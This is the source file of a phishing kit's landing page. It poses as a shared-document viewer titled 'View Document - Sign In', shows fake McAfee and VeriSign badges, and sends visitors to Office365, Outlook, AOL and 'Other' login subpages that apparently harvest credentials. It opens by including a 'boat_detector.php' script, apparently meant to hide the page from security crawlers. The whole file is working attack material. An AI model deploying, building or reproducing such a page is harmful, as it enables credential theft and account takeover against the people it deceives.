<?php include('boat_detector.php'); ?>
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="keywords" content=""><meta name="description" content="">
	<link href="img/favicon.png" rel="shortcut icon" />
	<title>View Document - Sign In</title>
	<link rel="stylesheet" href="style.css"/>
</head>
<body>

<div class="pop_inner_main">
<div class="logo"><img alt="" src="img/logo.png" /> <a alt="" class="fb_btm">Select and sign in to view document.</a></div>

<div class="inner_content_body">
<div class="inner_lft"><a href="#"><img alt="" src="img/box.png" /></a></div>

<div class="inner_rhgt"><span><a href="office365/index.php"><img alt="" src="img/officelogo.png" /> </a></span> </a></span> <span><a href="outlook/index.php"> <img alt="" src="img/outlooklogo.png" /> </a></span> <span><a href="aol/index.php"> <img alt="" src="img/aollogo.png" /> </a></span> <span><a class="trxt_bx" href="other/index.php"> Other </a></span></div>
</div>

<div class="footer_img"><a><img alt="" src="img/mcafee.png" style="width: 110px;" /></a> <a><img alt="" src="img/ssl_verisign.png" style="width: 110px;" /></a></div>
</div>

<div class="footer_main">
<div class="footer_inng">
<ul>
	<li>
	<h3>Business</h3>
	</li>
	<li></li>
	<li><a> Home</a></li>
	<li></li>
	<li><a> Enterprise</a></li>
	<li></li>
	<li><a> Desktop Client</a></li>
	<li></li>
	<li><a> Mobile</a></li>
	<li></li>
	<li><a> Pricing </a></li>
	<li></li>
	<li><a> Security</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Resources</h3>
	</li>
	<li></li>
	<li><a> Blog</a></li>
	<li></li>
	<li><a> Partners</a></li>
	<li></li>
	<li><a> Press</a></li>
	<li></li>
	<li><a> FAQs</a></li>
	<li></li>
	<li><a> Buy</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Support</h3>
	</li>
	<li></li>
	<li><a> Help Center</a></li>
	<li></li>
	<li><a> Contact us</a></li>
	<li></li>
	<li><a> Support</a></li>
	<li></li>
	<li><a> Cookies</a></li>
	<li></li>
	<li><a> Privacy terms</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Community</h3>
	</li>
	<li></li>
	<li><a> Developers</a></li>
	<li></li>
	<li><a> Referrals</a></li>
	<li></li>
	<li><a> Forum</a></li>
	<li></li>
	<li><a> Integrations</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Connect</h3>
	</li>
	<li></li>
	<li><a> Twitter</a></li>
	<li></li>
	<li><a> Facebook</a></li>
	<li></li>
	<li><a> LinkedIn</a></li>
	<li></li>
	<li><a> Google+</a></li>
	<li></li>
	<li><a> You Tube</a></li>
	<li></li>
</ul>
</div>
</div>
</body>
</html>